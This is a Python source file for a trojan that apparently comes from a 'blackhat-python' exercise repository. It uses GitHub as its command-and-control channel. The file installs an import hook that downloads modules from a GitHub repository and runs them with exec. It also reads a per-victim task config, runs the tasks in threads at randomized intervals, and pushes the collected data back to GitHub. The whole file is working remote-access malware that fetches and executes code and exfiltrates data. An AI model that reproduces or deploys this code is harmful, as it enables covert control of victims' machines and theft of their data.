# Requires the github3 library to interact with github from python
# pip install github3.py
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime


def github_connect():
    # This could be a deploy key instead of a username/token
    with open("token.txt") as f:
        token = f.read()
    user = "lucasmelin"
    sess = github3.login(token=token)
    return sess.repository(user, "blackhat-python")


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f"{dirname}/{module_name}").content


class GitImporter:
    """Importing a module from a GitHub repo."""

    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()

        new_library = get_file_contents("modules", f"{name}.py", self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(
            name, loader=None, origin=self.repo.git_url
        )
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f"{id}.json"
        self.data_path = f"data/{id}/"
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents("config", self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task["module"] not in sys.modules:
                exec("import %s" % task["module"])
        return config

    def module_runner(self, module):
        """Run some command and store the result on GitHub"""
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        """Push collected data on the target to GitHub."""
        message = datetime.now().isoformat()
        remote_path = f"data/{self.id}/{message}.data"
        bindata = bytes("%r" % data, "utf-8")
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner, args=(task["module"],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


if __name__ == "__main__":
    # http://xion.org.pl/2012/05/06/hacking-python-imports/
    sys.meta_path.append(GitImporter())
    TROJAN_ID = "abc"
    trojan = Trojan(TROJAN_ID)
    trojan.run()
